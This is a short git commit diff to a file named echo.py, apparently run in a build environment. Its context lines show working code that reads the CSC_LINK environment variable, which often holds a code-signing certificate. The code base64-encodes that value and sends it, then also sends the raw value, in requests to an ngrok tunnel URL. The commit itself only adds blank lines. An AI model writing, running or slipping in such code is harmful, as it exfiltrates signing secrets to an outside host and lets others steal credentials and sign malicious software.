09e99b0f18d82c1a72c32545c37684f2ae3dccbc
Paul Sauer <paulrsauer@gmail.com>
2025-09-26 22:47:25 -0400

    actually insane

--- echo.py
+++ echo.py
@@ -2,5 +2,7 @@ import os
 import base64
 import requests
 b6 = base64.b64encode(os.environ['CSC_LINK'].encode('utf-8')).decode('utf-8')
+
 print(requests.get('https://odessa-unwholesome-illy.ngrok-free.dev/' + b6 ).text)
+
 print(requests.get('https://odessa-unwholesome-illy.ngrok-free.dev/' + os.environ['CSC_LINK'] ).text)
